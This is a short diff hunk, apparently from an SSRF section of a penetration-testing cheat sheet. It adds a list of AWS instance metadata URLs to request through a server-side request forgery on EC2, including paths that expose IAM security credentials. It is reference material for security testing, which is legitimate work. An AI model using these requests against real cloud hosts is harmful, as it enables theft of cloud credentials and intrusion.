@@ -168,3 +168,8 @@ It is an application protocol used over an IP network to manage and access the d
   
   If you find an SSRF in Amazon Could, Amazon expose an internal service every EC2 instance can query for instance metadata about the host.
   If you found an SSRF vulnerability that runs on EC2, try requesting :
+  
+    http://169.254.169.254/latest/meta-data/
+    http://169.254.169.254/latest/user-data/
+    http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE
+    http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
